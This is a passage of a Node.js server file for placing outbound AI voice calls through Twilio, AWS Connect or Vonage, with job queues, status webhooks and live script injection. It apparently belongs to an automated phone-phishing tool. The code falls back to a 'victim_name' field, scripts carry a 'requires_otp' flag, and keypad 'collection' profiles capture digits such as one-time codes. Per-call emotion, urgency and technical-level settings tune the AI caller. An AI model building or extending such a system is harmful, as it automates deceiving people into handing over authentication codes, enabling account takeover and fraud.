        .json({ success: false, error: "phone_number is required" });
    }
    if (!["blocked", "allowed", "spam"].includes(status)) {
      return res.status(400).json({
        success: false,
        error: "status must be blocked, allowed, or spam",
      });
    }
    const flag = await db.setCallerFlag(phone, status, {
      note,
      updated_by: req.headers?.["x-admin-user"] || null,
      source: "api",
    });
    res.json({ success: true, flag });
  } catch (error) {
    console.error("Failed to set caller flag:", error);
    res
      .status(500)
      .json({ success: false, error: "Failed to set caller flag" });
  }
});

async function buildRetryPayload(callSid) {
  const callRecord = await db.getCall(callSid);
  if (!callRecord) {
    throw new Error("Call not found");
  }
  const callState = await db
    .getLatestCallState(callSid, "call_created")
    .catch(() => null);

  return {
    number: callRecord.phone_number,
    prompt: callRecord.prompt,
    first_message: callRecord.first_message,
    user_chat_id: callRecord.user_chat_id,
    customer_name: callState?.customer_name || callState?.victim_name || null,
    business_id: callState?.business_id || null,
    script: callState?.script || null,
    script_id: callState?.script_id || null,
    purpose: callState?.purpose || null,
    emotion: callState?.emotion || null,
    urgency: callState?.urgency || null,
    technical_level: callState?.technical_level || null,
    voice_model: callState?.voice_model || null,
    collection_profile: callState?.collection_profile || null,
    collection_expected_length: callState?.collection_expected_length || null,
    collection_timeout_s: callState?.collection_timeout_s || null,
    collection_max_retries: callState?.collection_max_retries || null,
    collection_mask_for_gpt: callState?.collection_mask_for_gpt,
    collection_speak_confirmation: callState?.collection_speak_confirmation,
  };
}

async function scheduleCallJob(jobType, payload, runAt = null) {
  if (!db) throw new Error("Database not initialized");
  return db.createCallJob(jobType, payload, runAt);
}

function computeCallJobBackoff(attempt) {
  const base = Number(config.callJobs?.retryBaseMs) || 5000;
  const max = Number(config.callJobs?.retryMaxMs) || 60000;
  const exp = Math.max(0, Number(attempt) - 1);
  const delay = Math.min(base * Math.pow(2, exp), max);
  return delay;
}

async function runWithTimeout(
  operationPromise,
  timeoutMs,
  label = "operation",
  timeoutCode = "operation_timeout",
) {
  const safeTimeoutMs = Number(timeoutMs);
  if (!Number.isFinite(safeTimeoutMs) || safeTimeoutMs <= 0) {
    return operationPromise;
  }
  let settled = false;
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      if (settled) return;
      settled = true;
      const timeoutError = new Error(
        `${label} timed out after ${safeTimeoutMs}ms`,
      );
      timeoutError.code = timeoutCode;
      reject(timeoutError);
    }, safeTimeoutMs);

    Promise.resolve(operationPromise)
      .then((result) => {
        if (settled) return;
        settled = true;
        clearTimeout(timer);
        resolve(result);
      })
      .catch((error) => {
        if (settled) return;
        settled = true;
        clearTimeout(timer);
        reject(error);
      });
  });
}

async function processCallJobs() {
  if (!db || callJobProcessing) return;
  callJobProcessing = true;
  try {
    const staleLockMs = Number(config.callJobs?.staleLockMs) || 300000;
    const reclaimedJobs = await db.reclaimStaleRunningCallJobs(staleLockMs);
    if (reclaimedJobs > 0) {
      console.warn(
        `Reclaimed ${reclaimedJobs} stale call job lock(s) older than ${staleLockMs}ms`,
      );
      db
        ?.logServiceHealth?.("call_jobs", "jobs_reclaimed", {
          reclaimed_jobs: reclaimedJobs,
          stale_lock_ms: staleLockMs,
          at: new Date().toISOString(),
        })
        .catch(() => {});
    }

    const jobs = await db.claimDueCallJobs(10);
    const jobTimeoutMs = Number(config.callJobs?.timeoutMs) || 45000;
    for (const job of jobs) {
      let payload = {};
      try {
        payload = job.payload ? JSON.parse(job.payload) : {};
      } catch {
        payload = {};
      }
      try {
        if (
          job.job_type === "outbound_call" ||
          job.job_type === "callback_call"
        ) {
          await runWithTimeout(
            placeOutboundCall(payload),
            jobTimeoutMs,
            `call job ${job.id}`,
            "call_job_timeout",
          );
        } else if (job.job_type === "sms_scheduled_send") {
          const to = String(payload?.to || "").trim();
          const message = String(payload?.message || "").trim();
          const from = payload?.from || null;
          const userChatId = payload?.user_chat_id || null;
          if (!to || !message) {
            throw new Error("sms_scheduled_send requires to and message");
          }
          const smsOptions = {
            ...(payload?.sms_options || {}),
            allowQuietHours: false,
            minIntervalMs: 0,
          };
          if (payload?.idempotency_key && !smsOptions.idempotencyKey) {
            smsOptions.idempotencyKey = payload.idempotency_key;
          }
          if (userChatId && !smsOptions.userChatId) {
            smsOptions.userChatId = userChatId;
          }
          const smsResult = await runWithTimeout(
            smsService.sendSMS(to, message, from, smsOptions),
            jobTimeoutMs,
            `sms job ${job.id}`,
            "call_job_timeout",
          );
          if (smsResult?.message_sid && db && smsResult.idempotent !== true) {
            try {
              await db.saveSMSMessage({
                message_sid: smsResult.message_sid,
                to_number: to,
                from_number: smsResult.from || from,
                body: message,
                status: smsResult.status || "queued",
                direction: "outbound",
                user_chat_id: userChatId || null,
              });
            } catch (saveError) {
              const saveMsg = String(saveError?.message || "");
              if (
                !saveMsg.includes("UNIQUE constraint failed") &&
                !saveMsg.includes("SQLITE_CONSTRAINT")
              ) {
                throw saveError;
              }
            }
            if (userChatId) {
              await db.createEnhancedWebhookNotification(
                smsResult.message_sid,
                "sms_sent",
                String(userChatId),
              );
            }
          }
        } else {
          throw new Error(`Unsupported job type ${job.job_type}`);
        }
        await db.completeCallJob(job.id, "completed");
      } catch (error) {
        const isTimeout = error?.code === "call_job_timeout";
        if (isTimeout) {
          db
            ?.logServiceHealth?.("call_jobs", "job_timeout", {
              job_id: job.id,
              job_type: job.job_type,
              timeout_ms: jobTimeoutMs,
              attempts: Number(job.attempts) || 1,
              at: new Date().toISOString(),
            })
            .catch(() => {});
        }
        const attempts = Number(job.attempts) || 1;
        const maxAttempts = Number(config.callJobs?.maxAttempts) || 3;
        if (attempts >= maxAttempts) {
          const failureReason = error.message || String(error);
          await db.completeCallJob(
            job.id,
            "failed",
            failureReason,
          );
          await db.moveCallJobToDlq(
            {
              ...job,
              attempts,
            },
            "max_attempts_exceeded",
            failureReason,
          );
          db
            ?.logServiceHealth?.("call_jobs", "job_dead_lettered", {
              job_id: job.id,
              job_type: job.job_type,
              attempts,
              max_attempts: maxAttempts,
              reason: failureReason,
              at: new Date().toISOString(),
            })
            .catch(() => {});
          const openDlqCount = await db.countOpenCallJobDlq().catch(() => null);
          const dlqAlertThreshold =
            Number(config.callJobs?.dlqAlertThreshold) || 20;
          if (openDlqCount !== null && openDlqCount >= dlqAlertThreshold) {
            db
              ?.logServiceHealth?.("call_jobs", "dlq_alert_threshold", {
                open_dlq: openDlqCount,
                alert_threshold: dlqAlertThreshold,
                at: new Date().toISOString(),
              })
              .catch(() => {});
          }
        } else {
          const delay = computeCallJobBackoff(attempts);
          const nextRunAt = new Date(Date.now() + delay).toISOString();
          await db.rescheduleCallJob(
            job.id,
            nextRunAt,
            error.message || String(error),
          );
        }
      }
    }
  } catch (error) {
    console.error("Call job processor error:", error);
  } finally {
    callJobProcessing = false;
  }
}

async function placeOutboundCall(payload, hostOverride = null) {
  const {
    number,
    prompt,
    first_message,
    user_chat_id,
    customer_name,
    business_id,
    script,
    script_id,
    purpose,
    emotion,
    urgency,
    technical_level,
    voice_model,
    collection_profile,
    collection_expected_length,
    collection_timeout_s,
    collection_max_retries,
    collection_mask_for_gpt,
    collection_speak_confirmation,
  } = payload || {};

  if (!number || !prompt || !first_message) {
    throw new Error(
      "Missing required fields: number, prompt, and first_message are required",
    );
  }

  if (!number.match(/^\+[1-9]\d{1,14}$/)) {
    throw new Error(
      "Invalid phone number format. Use E.164 format (e.g., +1234567890)",
    );
  }

  const host = hostOverride || config.server?.hostname;
  if (!host) {
    throw new Error("Server hostname not configured");
  }

  console.log("Generating adaptive function system for call...".blue);
  const functionSystem = functionEngine.generateAdaptiveFunctionSystem(
    prompt,
    first_message,
  );
  console.log(
    `Generated ${functionSystem.functions.length} functions for ${functionSystem.context.industry} industry`,
  );

  let scriptPolicy = {};
  if (script_id) {
    try {
      const tpl = await db.getCallTemplateById(Number(script_id));
      if (tpl) {
        scriptPolicy = {
          requires_otp: !!tpl.requires_otp,
          default_profile: tpl.default_profile || null,
          expected_length: tpl.expected_length || null,
          allow_terminator: !!tpl.allow_terminator,
          terminator_char: tpl.terminator_char || null,
        };
      }
    } catch (err) {
      console.error("Script metadata load error:", err);
    }
  }

  let callId;
  let callStatus = "queued";
  let providerMetadata = {};
  let selectedProvider = null;
  const keypadRequired = isKeypadRequiredFlow(collection_profile, scriptPolicy);
  const keypadRequiredReason = keypadRequired
    ? `profile=${
        normalizeDigitProfile(collection_profile) ||
        normalizeDigitProfile(scriptPolicy?.default_profile) ||
        "unknown"
      }, script_requires_otp=${scriptPolicy?.requires_otp ? "true" : "false"}`
    : null;
  const keypadOverride = keypadRequired
    ? resolveKeypadProviderOverride(collection_profile, scriptPolicy, script_id)
    : null;

  const readiness = getProviderReadiness();
  const preferredProvider = keypadOverride?.provider || currentProvider;
  const orderedProviders = getProviderOrder(preferredProvider);
  let availableProviders = orderedProviders.filter(
    (provider) => readiness[provider],
  );
  if (keypadOverride && !availableProviders.includes(preferredProvider)) {
    console.warn(
      `Provider guard override for ${keypadOverride.scopeKey} requested ${preferredProvider}, but provider is unavailable. Falling back to available keypad-capable providers.`,
    );
  } else if (keypadOverride) {
    console.log(
      `Provider guard override active for ${keypadOverride.scopeKey}: preferring ${preferredProvider} until ${new Date(
        keypadOverride.expiresAt,
      ).toISOString()}`,
    );
  }
  if (keypadRequired) {
    const keypadProviders = availableProviders.filter((provider) =>
      supportsKeypadCaptureProvider(provider),
    );
    if (!keypadProviders.length) {
      throw new Error(
        "This call requires keypad digit capture, but no keypad-capable provider is configured. Configure Twilio or enable VONAGE_DTMF_WEBHOOK_ENABLED=true.",
      );
    }
    if (
      keypadProviders.length !== availableProviders.length &&
      !keypadProviderGuardWarnings.has(currentProvider)
    ) {
      console.warn(
        `Provider guard: restricting outbound call providers for keypad flow (${keypadRequiredReason || "digit_capture"}) to ${keypadProviders.join(", ")}`,
      );
      keypadProviderGuardWarnings.add(currentProvider);
    }
    availableProviders = keypadProviders;
  }
  if (!availableProviders.length) {
    throw new Error("No outbound provider configured");
  }
  const failoverEnabled = config.providerFailover?.enabled !== false;
  const healthyProviders = failoverEnabled
    ? availableProviders.filter((provider) => !isProviderDegraded(provider))
    : availableProviders;
  const attemptProviders = healthyProviders.length
    ? healthyProviders
    : availableProviders;
  let lastError = null;

  for (const provider of attemptProviders) {
    try {
      if (provider === "twilio") {
        warnIfMachineDetectionDisabled("outbound-call");
        const accountSid = config.twilio.accountSid;
        const authToken = config.twilio.authToken;
        const fromNumber = config.twilio.fromNumber;

        if (!accountSid || !authToken || !fromNumber) {
          throw new Error("Twilio credentials not configured");
        }

        const client = twilio(accountSid, authToken);
        const twimlUrl = `https://${host}/incoming`;
        const statusUrl = `https://${host}/webhook/call-status`;
        console.log(
          `Twilio call URLs: twiml=${twimlUrl} statusCallback=${statusUrl}`,
        );
        const callPayload = {
          url: twimlUrl,
          to: number,
          from: fromNumber,
          statusCallback: statusUrl,
          statusCallbackEvent: [
            "initiated",
            "ringing",
            "answered",
            "completed",
            "busy",
            "no-answer",
            "canceled",
            "failed",
          ],
          statusCallbackMethod: "POST",
        };
        if (config.twilio?.machineDetection) {
          callPayload.machineDetection = config.twilio.machineDetection;
        }
        if (Number.isFinite(config.twilio?.machineDetectionTimeout)) {
          callPayload.machineDetectionTimeout =
            config.twilio.machineDetectionTimeout;
        }
        const call = await client.calls.create(callPayload);
        callId = call.sid;
        callStatus = call.status || "queued";
      } else if (provider === "aws") {
        const awsAdapter = getAwsConnectAdapter();
        callId = uuidv4();
        const response = await awsAdapter.startOutboundCall({
          destinationPhoneNumber: number,
          clientToken: callId,
          attributes: {
            CALL_SID: callId,
            FIRST_MESSAGE: first_message,
          },
        });
        providerMetadata = { contact_id: response.ContactId };
        if (response.ContactId) {
          awsContactMap.set(response.ContactId, callId);
        }
        callStatus = "queued";
      } else if (provider === "vonage") {
        const vonageAdapter = getVonageVoiceAdapter();
        callId = uuidv4();
        const webhookReq = reqForHost(host);
        const answerUrl = buildVonageAnswerWebhookUrl(webhookReq, callId);
        const eventUrl = buildVonageEventWebhookUrl(webhookReq, callId);

        const wsUrl = host
          ? buildVonageWebsocketUrl(webhookReq, callId, {
              direction: "outbound",
            })
          : "";
        const ncco = wsUrl
          ? [
              {
                action: "connect",
                endpoint: [
                  {
                    type: "websocket",
                    uri: wsUrl,
                    "content-type": getVonageWebsocketContentType(),
                  },
                ],
              },
            ]
          : null;

        if (!ncco && !answerUrl) {
          throw new Error(
            "Vonage requires a public SERVER hostname or VONAGE_ANSWER_URL",
          );
        }
        const response = await vonageAdapter.createOutboundCall({
          to: number,
          callSid: callId,
          answerUrl,
          eventUrl,
          ncco: ncco || undefined,
        });
        const vonageUuid = response?.uuid;
        providerMetadata = {
          vonage_uuid: vonageUuid || null,
          answer_url: answerUrl || null,
          event_url: eventUrl || null,
        };
        if (vonageUuid) {
          rememberVonageCallMapping(callId, vonageUuid, "outbound_create");
        }
        callStatus = response?.status || "queued";
      } else {
        throw new Error(`Unsupported provider ${provider}`);
      }
      recordProviderSuccess(provider);
      selectedProvider = provider;
      break;
    } catch (error) {
      lastError = error;
      recordProviderError(provider, error);
      console.error(
        `Outbound call failed for provider ${provider}:`,
        error.message || error,
      );
    }
  }

  if (!selectedProvider) {
    throw lastError || new Error("Failed to place outbound call");
  }
  if (keypadOverride) {
    providerMetadata = {
      ...providerMetadata,
      provider_guard_override: {
        scope_key: keypadOverride.scopeKey,
        provider: keypadOverride.provider,
        expires_at: keypadOverride.expiresAt
          ? new Date(keypadOverride.expiresAt).toISOString()
          : null,
        reason: keypadOverride.reason || "vonage_dtmf_timeout",
      },
    };
  }

  const createdAt = new Date().toISOString();
  const callConfig = {
    prompt: prompt,
    first_message: first_message,
    created_at: createdAt,
    user_chat_id: user_chat_id,
    customer_name: customer_name || null,
    provider: selectedProvider || currentProvider,
    provider_metadata: providerMetadata,
    business_context: functionSystem.context,
    function_count: functionSystem.functions.length,
    purpose: purpose || null,
    business_id: business_id || null,
    script: script || null,
    script_id: script_id || null,
    emotion: emotion || null,
    urgency: urgency || null,
    technical_level: technical_level || null,
    voice_model: voice_model || null,
    collection_profile: collection_profile || null,
    collection_expected_length: collection_expected_length || null,
    collection_timeout_s: collection_timeout_s || null,
    collection_max_retries: collection_max_retries || null,
    collection_mask_for_gpt: collection_mask_for_gpt,
    collection_speak_confirmation: collection_speak_confirmation,
    script_policy: scriptPolicy,
    flow_state: "normal",
    flow_state_updated_at: createdAt,
    call_mode: "normal",
    digit_capture_active: false,
    inbound: false,
  };

  callConfigurations.set(callId, callConfig);
  callFunctionSystems.set(callId, functionSystem);

  try {
    await db.createCall({
      call_sid: callId,
      phone_number: number,
      prompt: prompt,
      first_message: first_message,
      user_chat_id: user_chat_id,
      business_context: JSON.stringify(functionSystem.context),
      generated_functions: JSON.stringify(
        functionSystem.functions.map((f) => f.function.name),
      ),
      direction: "outbound",
    });
    await db.updateCallState(callId, "call_created", {
      customer_name: customer_name || null,
      business_id: business_id || null,
      script: script || null,
      script_id: script_id || null,
      purpose: purpose || null,
      emotion: emotion || null,
      urgency: urgency || null,
      technical_level: technical_level || null,
      voice_model: voice_model || null,
      provider: selectedProvider || currentProvider,
      provider_metadata: providerMetadata,
      from:
        (selectedProvider || currentProvider) === "twilio"
          ? config.twilio?.fromNumber
          : null,
      to: number || null,
      inbound: false,
      collection_profile: collection_profile || null,
      collection_expected_length: collection_expected_length || null,
      collection_timeout_s: collection_timeout_s || null,
      collection_max_retries: collection_max_retries || null,
      collection_mask_for_gpt: collection_mask_for_gpt,
      collection_speak_confirmation: collection_speak_confirmation,
    });

    if (user_chat_id) {
      await db.createEnhancedWebhookNotification(
        callId,
        "call_initiated",
        user_chat_id,
      );
    }

    console.log(`Enhanced adaptive call created: ${callId} to ${number}`);
    console.log(
      `Business context: ${functionSystem.context.industry} - ${functionSystem.context.businessType}`,
    );
  } catch (dbError) {
    console.error("Database error:", dbError);
  }

  return { callId, callStatus, functionSystem };
}

// Enhanced outbound call endpoint with dynamic function generation
app.post("/outbound-call", async (req, res) => {
  try {
    const resolvedCustomerName =
      req.body?.customer_name ?? req.body?.victim_name ?? null;
    const payload = {
      number: req.body?.number,
      prompt: req.body?.prompt,
      first_message: req.body?.first_message,
      user_chat_id: req.body?.user_chat_id,
      customer_name: resolvedCustomerName,
      business_id: req.body?.business_id,
      script: req.body?.script,
      script_id: req.body?.script_id,
      purpose: req.body?.purpose,
      emotion: req.body?.emotion,
      urgency: req.body?.urgency,
      technical_level: req.body?.technical_level,
      voice_model: req.body?.voice_model,
      collection_profile: req.body?.collection_profile,
      collection_expected_length: req.body?.collection_expected_length,
      collection_timeout_s: req.body?.collection_timeout_s,
      collection_max_retries: req.body?.collection_max_retries,
      collection_mask_for_gpt: req.body?.collection_mask_for_gpt,
      collection_speak_confirmation: req.body?.collection_speak_confirmation,
    };

    const host = resolveHost(req) || config.server?.hostname;
    const result = await placeOutboundCall(payload, host);

    res.json({
      success: true,
      call_sid: result.callId,
      to: payload.number,
      status: result.callStatus,
      provider: currentProvider,
      business_context: result.functionSystem.context,
      generated_functions: result.functionSystem.functions.length,
      function_types: result.functionSystem.functions.map(
        (f) => f.function.name,
      ),
      enhanced_webhooks: true,
    });
  } catch (error) {
    console.error("Error creating enhanced adaptive outbound call:", error);
    res.status(500).json({
      error: "Failed to create outbound call",
      details: error.message,
    });
  }
});

async function processCallStatusWebhookPayload(payload = {}, options = {}) {
  const {
    CallSid,
    CallStatus,
    Duration,
    From,
    To,
    CallDuration,
    AnsweredBy,
    ErrorCode,
    ErrorMessage,
    DialCallDuration,
  } = payload || {};

  if (!CallSid) {
    const err = new Error("Missing CallSid");
    err.code = "missing_call_sid";
    throw err;
  }

  const source = options.source || "provider";
  if (!shouldProcessCallStatusPayload(payload, options)) {
    console.log(`⏭️ Duplicate status webhook ignored for ${CallSid}`);
    return { ok: true, callSid: CallSid, deduped: true };
  }

  console.log(`Fixed Webhook: Call ${CallSid} status: ${CallStatus}`.blue);
  console.log(`Debug Info:`);
  console.log(`Duration: ${Duration || "N/A"}`);
  console.log(`CallDuration: ${CallDuration || "N/A"}`);
  console.log(`DialCallDuration: ${DialCallDuration || "N/A"}`);
  console.log(`AnsweredBy: ${AnsweredBy || "N/A"}`);

  const durationCandidates = [Duration, CallDuration, DialCallDuration]
    .map((value) => parseInt(value, 10))
    .filter((value) => Number.isFinite(value));
  const durationValue = durationCandidates.length
    ? Math.max(...durationCandidates)
    : 0;

  let call = await db.getCall(CallSid);
  if (!call) {
    console.warn(`Webhook received for unknown call: ${CallSid}`);
    call = await ensureCallRecord(CallSid, payload, "status_webhook", {
      provider: "twilio",
      inbound: !isOutboundTwilioDirection(
        payload?.Direction || payload?.direction,
      ),
    });
    if (!call) {
      return { ok: false, error: "call_not_found", callSid: CallSid };
    }
  }

  const streamMediaState = await db
    .getLatestCallState(CallSid, "stream_media")
    .catch(() => null);
  const hasStreamMedia = Boolean(
    streamMediaState?.at || streamMediaState?.timestamp,
  );
  let notificationType = null;
  const rawStatus = String(CallStatus || "").toLowerCase();
  const answeredByValue = String(AnsweredBy || "").toLowerCase();
  const isMachineAnswered = [
    "machine_start",
    "machine_end",
    "machine",
    "fax",
  ].includes(answeredByValue);
  const voicemailDetected = isMachineAnswered;
  let actualStatus = rawStatus || "unknown";
  const priorStatus = String(call.status || "").toLowerCase();
  const hasAnswerEvidence =
    !!call.started_at ||
    ["answered", "in-progress", "completed"].includes(priorStatus) ||
    durationValue > 0 ||
    !!AnsweredBy ||
    hasStreamMedia;

  if (voicemailDetected) {
    console.log(
      `AMD detected voicemail (${answeredByValue}) - classifying as no-answer`
        .yellow,
    );
    actualStatus = "no-answer";
    notificationType = "call_no_answer";
  } else if (actualStatus === "completed") {
    console.log(`Analyzing completed call: Duration = ${durationValue}s`);

    if ((durationValue === 0 || durationValue < 6) && !hasAnswerEvidence) {
      console.log(
        `Short duration detected (${durationValue}s) - treating as no-answer`
          .red,
      );
      actualStatus = "no-answer";
      notificationType = "call_no_answer";
    } else if (voicemailDetected && durationValue < 10 && !hasAnswerEvidence) {
      console.log(
        `Voicemail detected with short duration - classifying as no-answer`.red,
      );
      actualStatus = "no-answer";
      notificationType = "call_no_answer";
    } else {
      console.log(
        `Valid call duration (${durationValue}s) - confirmed answered`,
      );
      actualStatus = "completed";
      notificationType = "call_completed";
    }
  } else {
    switch (actualStatus) {
      case "queued":
      case "initiated":
        notificationType = "call_initiated";
        break;
      case "ringing":
        notificationType = "call_ringing";
        break;
      case "in-progress":
        notificationType = "call_in_progress";
        break;
      case "answered":
        notificationType = "call_answered";
        break;
      case "busy":
        notificationType = "call_busy";
        break;
      case "no-answer":
        notificationType = "call_no_answer";
        break;
      case "voicemail":
        actualStatus = "no-answer";
        notificationType = "call_no_answer";
        break;
      case "failed":
        notificationType = "call_failed";
        break;
      case "canceled":
        notificationType = "call_canceled";
        break;
      default:
        console.warn(`Unknown call status: ${CallStatus}`);
        notificationType = `call_${actualStatus}`;
    }
  }

  if (actualStatus === "no-answer" && hasAnswerEvidence && !voicemailDetected) {
    actualStatus = "completed";
    notificationType = "call_completed";
  }

  console.log(
    `Final determination: ${CallStatus} → ${actualStatus} → ${notificationType}`,
  );

  const updateData = {
    duration: durationValue,
    twilio_status: CallStatus,
    answered_by: AnsweredBy,
    error_code: ErrorCode,
    error_message: ErrorMessage,
  };

  const applyStatus = shouldApplyStatusUpdate(priorStatus, actualStatus, {
    allowTerminalUpgrade: actualStatus === "completed",
  });
  const finalStatus = applyStatus
    ? actualStatus
    : normalizeCallStatus(priorStatus || actualStatus);
  const finalNotificationType = applyStatus ? notificationType : null;

  if (applyStatus && actualStatus === "ringing") {
    try {
      await db.updateCallState(CallSid, "ringing", {
        at: new Date().toISOString(),
      });
    } catch (stateError) {
      console.error("Failed to record ringing state:", stateError);
    }
  }

  if (applyStatus && actualStatus === "no-answer" && call.created_at) {
    let ringStart = null;
    try {
      const ringState = await db.getLatestCallState(CallSid, "ringing");
      ringStart = ringState?.at || ringState?.timestamp || null;
    } catch (stateError) {
      console.error("Failed to load ringing state:", stateError);
    }

    const now = new Date();
    const callStart = new Date(call.created_at);
    const ringStartTime = ringStart ? new Date(ringStart) : callStart;
    const ringDuration = Math.round((now - ringStartTime) / 1000);
    updateData.ring_duration = ringDuration;
    if (!updateData.duration || updateData.duration < ringDuration) {
      updateData.duration = ringDuration;
    }
    console.log(`Calculated ring duration: ${ringDuration}s`);
  }

  if (
    applyStatus &&
    ["in-progress", "answered"].includes(actualStatus) &&
    !call.started_at
  ) {
    updateData.started_at = new Date().toISOString();
  } else if (applyStatus && !call.ended_at) {
    const isTerminal = [
      "completed",
      "no-answer",
      "failed",
      "busy",
      "canceled",
    ].includes(actualStatus);
    const rawTerminal = [
      "completed",
      "no-answer",
      "failed",
      "busy",
      "canceled",
    ].includes(rawStatus);
    if (isTerminal && rawTerminal) {
      updateData.ended_at = new Date().toISOString();
    }
  }

  await db.updateCallStatus(CallSid, finalStatus, updateData);
  if (applyStatus) {
    recordCallLifecycle(CallSid, finalStatus, {
      source,
      raw_status: CallStatus,
      answered_by: AnsweredBy,
      duration: updateData.duration,
    });
    if (isTerminalStatusKey(finalStatus)) {
      scheduleCallLifecycleCleanup(CallSid);
    }
  }

  if (
    call.user_chat_id &&
    finalNotificationType &&
    !options.skipNotifications
  ) {
    try {
      await db.createEnhancedWebhookNotification(
        CallSid,
        finalNotificationType,
        call.user_chat_id,
      );
      console.log(
        `📨 Created corrected ${finalNotificationType} notification for call ${CallSid}`,
      );

      if (actualStatus !== CallStatus.toLowerCase()) {
        await db.logServiceHealth("webhook_system", "status_corrected", {
          call_sid: CallSid,
          original_status: CallStatus,
          corrected_status: actualStatus,
          duration: updateData.duration,
          reason: "Short duration analysis",
          source,
        });
      }
    } catch (notificationError) {
      console.error(
        "Error creating enhanced webhook notification:",
        notificationError,
      );
    }
  }

  console.log(
    `Fixed webhook processed: ${CallSid} -> ${CallStatus} (corrected to: ${actualStatus})`,
  );
  if (updateData.duration) {
    const minutes = Math.floor(updateData.duration / 60);
    const seconds = updateData.duration % 60;
    console.log(
      `Call metrics: ${minutes}:${String(seconds).padStart(2, "0")} duration`,
    );
  }

  await db.logServiceHealth("webhook_system", "status_received", {
    call_sid: CallSid,
    original_status: CallStatus,
    final_status: actualStatus,
    duration: updateData.duration,
    answered_by: AnsweredBy,
    correction_applied: actualStatus !== CallStatus.toLowerCase(),
    source,
  });

  return {
    ok: true,
    callSid: CallSid,
    rawStatus,
    actualStatus,
    notificationType,
    duration: updateData.duration,
    voicemailDetected,
  };
}

// Enhanced webhook endpoint for call status updates
app.post("/webhook/call-status", async (req, res) => {
  try {
    if (!requireValidTwilioSignature(req, res, "/webhook/call-status")) {
      return;
    }
    await processCallStatusWebhookPayload(req.body, { source: "provider" });
  } catch (error) {
    console.error("Error processing fixed call status webhook:", error);

    // Log error to service health
    try {
      await db.logServiceHealth("webhook_system", "error", {
        operation: "process_webhook",
        error: error.message,
        call_sid: req.body?.CallSid,
      });
    } catch (logError) {
      console.error("Failed to log webhook error:", logError);
    }
  }
  res.status(200).send("OK");
});

// Twilio Media Stream status callback
app.post("/webhook/twilio-stream", (req, res) => {
  try {
    if (!requireValidTwilioSignature(req, res, "/webhook/twilio-stream")) {
      return;
    }
    const payload = req.body || {};
    const callSid = payload.CallSid || payload.callSid || "unknown";
    const streamSid = payload.StreamSid || payload.streamSid || "unknown";
    const eventType =
      payload.EventType || payload.eventType || payload.event || "unknown";
    const dedupeKey = `${callSid}:${streamSid}:${eventType}`;
    const now = Date.now();
    const lastSeen = streamStatusDedupe.get(dedupeKey);
    if (!lastSeen || now - lastSeen > 2000) {
      streamStatusDedupe.set(dedupeKey, now);
      console.log("Twilio stream status", {
        callSid,
        streamSid,
        eventType,
        status: payload.StreamStatus || payload.streamStatus || null,
      });
    }

    if (eventType === "start") {
      if (callSid !== "unknown" && streamSid !== "unknown") {
        const existing = activeStreamConnections.get(callSid);
        if (!existing) {
          activeStreamConnections.set(callSid, {
            ws: null,
            streamSid,
            connectedAt: new Date().toISOString(),
          });
        }
        db.updateCallState(callSid, "stream_status_start", {
          stream_sid: streamSid,
          at: new Date().toISOString(),
        }).catch(() => {});
      }
    } else if (eventType === "end") {
      if (callSid !== "unknown") {
        db.updateCallState(callSid, "stream_status_end", {
          stream_sid: streamSid,
          at: new Date().toISOString(),
        }).catch(() => {});
      }
    }
  } catch (err) {
    console.error("Twilio stream status webhook error:", err);
  }
  res.status(200).send("OK");
});

function escapeCsvValue(value) {
  if (value === null || value === undefined) return "";
  const str = String(value);
  if (/[",\n]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

function callsToCsv(calls = []) {
  const headers = [
    "call_sid",
    "status",
    "direction",
    "phone_number",
    "created_at",
    "duration",
    "answered_by",
    "error_code",
    "error_message",
  ];
  const lines = [headers.join(",")];
  for (const call of calls) {
    const row = headers.map((key) => escapeCsvValue(call?.[key]));
    lines.push(row.join(","));
  }
  return lines.join("\n");
}

function normalizeDateFilter(value, isEnd = false) {
  if (!value) return null;
  const raw = String(value).trim();
  if (!raw) return null;
  if (/^\d{4}-\d{2}-\d{2}$/.test(raw)) {
    return `${raw} ${isEnd ? "23:59:59" : "00:00:00"}`;
  }
  return raw;
}

async function handleInboundAdminDecision(callSid, action, adminId) {
  if (!callSid) {
    return { ok: false, error: "missing_call_sid" };
  }
  const callRecord = await db.getCall(callSid).catch(() => null);
  if (!callRecord) {
    return { ok: false, error: "call_not_found" };
  }
  const gate = webhookService.getInboundGate(callSid);
  if (
    gate?.status === "answered" ||
    gate?.status === "declined" ||
    gate?.status === "expired"
  ) {
    return { ok: false, error: "already_handled", status: gate?.status };
  }
  if (action === "answer") {
    webhookService.setInboundGate(callSid, "answered", { chatId: adminId });
    webhookService.setConsoleCompact(callSid, false);
    webhookService.addLiveEvent(callSid, "✅ Admin answered", { force: true });
    await db
      .updateCallState(callSid, "admin_answered", {
        at: new Date().toISOString(),
        by: adminId,
      })
      .catch(() => {});
    await connectInboundCall(callSid);
    return { ok: true, status: "answered" };
  }
  if (action === "decline") {
    webhookService.setInboundGate(callSid, "declined", { chatId: adminId });
    webhookService.addLiveEvent(callSid, "❌ Declined by admin", {
      force: true,
    });
    await db
      .updateCallState(callSid, "admin_declined", {
        at: new Date().toISOString(),
        by: adminId,
      })
      .catch(() => {});
    await endCallForProvider(callSid);
    await webhookService.setLiveCallPhase(callSid, "ended").catch(() => {});
    return { ok: true, status: "declined" };
  }
  return { ok: false, error: "invalid_action" };
}

function truncatePrompt(value, limit = 800) {
  const text = String(value || "").trim();
  if (!text) return "";
  if (text.length <= limit) return text;
  return `${text.slice(0, limit)}...`;
}

async function applyScriptInjection(callSid, scriptId, userId) {
  if (!callSid || !scriptId) return { ok: false, error: "missing_script" };
  if (!db) return { ok: false, error: "db_unavailable" };
  const script = await db.getCallTemplateById(scriptId);
  if (!script) return { ok: false, error: "script_not_found" };
  const callConfig = callConfigurations.get(callSid);
  if (!callConfig) return { ok: false, error: "call_not_active" };
  callConfig.script = script.name || callConfig.script;
  callConfig.script_id = script.id || callConfig.script_id;
  if (script.prompt) {
    callConfig.prompt = script.prompt;
  }
  if (script.first_message) {
    callConfig.first_message = script.first_message;
  }
  callConfigurations.set(callSid, callConfig);

  const session = activeCalls.get(callSid);
  if (session?.gptService) {
    const promptPreview = truncatePrompt(script.prompt || "");
    const intentLine = `Injected script: ${script.name || "custom"}. ${promptPreview}`;
    session.gptService.setCallIntent(intentLine);
  }

  await db
    .updateCallState(callSid, "script_injected", {
      script_id: script.id,
      script_name: script.name || null,
      user_id: userId || null,
      at: new Date().toISOString(),
    })
    .catch(() => {});

  return { ok: true, script };
}

// Enhanced API endpoints with adaptation analytics

